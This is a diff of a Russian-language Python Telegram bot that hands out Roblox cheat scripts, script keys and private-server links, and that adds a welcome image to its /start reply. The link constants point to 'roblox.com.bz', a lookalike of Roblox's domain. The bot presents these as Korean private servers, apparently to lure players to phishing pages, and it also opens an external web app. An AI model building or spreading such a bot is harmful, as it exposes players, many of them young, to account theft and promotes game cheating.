@@ -28,9 +28,14 @@ KOREAN_MM2_LINK = "https://roblox.com.bz/games/142823291/Murder-Mystery-2?privat
 KOREAN_ADOPT_LINK = "https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"
 
 # ============================================================
-# ПРАВИЛЬНАЯ ССЫЛКА (GITHUB PAGES, НЕ RAW)
+# ССЫЛКА НА МИНИ-ПРИЛОЖЕНИЕ (GitHub Pages)
 # ============================================================
 WEB_APP_URL = "https://fsfsfss323.github.io/webapp/"
+
+# ============================================================
+# ССЫЛКА НА КАРТИНКУ ДЛЯ ПРИВЕТСТВИЯ
+# ============================================================
+WELCOME_IMAGE_URL = "https://i.yapx.ru/eBNdd.jpg"
 
 GUIDE_TEXT = """
 📖 *КАК ЗАПУСТИТЬ СКРИПТЫ?*
@@ -219,15 +224,10 @@ def get_success_keyboard():
     keyboard.add(types.InlineKeyboardButton(text="📜 Скрипт на все игры", callback_data="get_script"))
     keyboard.add(types.InlineKeyboardButton(text="🔑 Ключ для скрипта", callback_data="get_key"))
     keyboard.add(types.InlineKeyboardButton(text="🔒 Приватный сервер MM2", callback_data="get_private"))
-    
-    # ============================================================
-    # КНОПКА С МИНИ-ПРИЛОЖЕНИЕМ (GitHub Pages)
-    # ============================================================
     keyboard.add(types.InlineKeyboardButton(
         text="🌐 ВСЕ СЕРВЕРА 🚀",
         web_app=types.WebAppInfo(url=WEB_APP_URL)
     ))
-    
     keyboard.add(types.InlineKeyboardButton(text="😮 КОРЕЙСКИЙ СЕРВЕР ММ2 😮", url=KOREAN_MM2_LINK))
     keyboard.add(types.InlineKeyboardButton(text="💘 КОРЕЙСКИЙ СЕРВЕР АДОПТ МИ 💘", url=KOREAN_ADOPT_LINK))
     keyboard.add(types.InlineKeyboardButton(text="📖 Как запустить скрипт?", callback_data="get_guide"))
@@ -244,6 +244,9 @@ def get_admin_keyboard():
     keyboard.add(types.InlineKeyboardButton("🗑 Удалить реф. ссылку", callback_data="admin_ref_del"))
     return keyboard
 
+# ============================================================
+# ОБНОВЛЁННАЯ ФУНКЦИЯ start С КАРТИНКОЙ
+# ============================================================
 @bot.message_handler(commands=["start"])
 def start(message):
     args = message.text.split()
@@ -256,7 +259,13 @@ def start(message):
         notify_admin(f"🆕 Новый пользователь!\n\n🆔 ID: {user.id}\n👤 Имя: {user.first_name}\n📛 @{user.username or 'нет'}\n👥 Всего: {count_users()}")
     
     if is_user_subscribed(message.from_user.id):
-        bot.send_message(message.chat.id, "✅ Добро пожаловать обратно!\n\nВыбери что хочешь получить:", reply_markup=get_success_keyboard())
+        caption = "✅ Добро пожаловать обратно!\n\nВыбери что хочешь получить:"
+        bot.send_photo(
+            message.chat.id,
+            photo=WELCOME_IMAGE_URL,
+            caption=caption,
+            reply_markup=get_success_keyboard()
+        )
         return
     
     if is_ref:
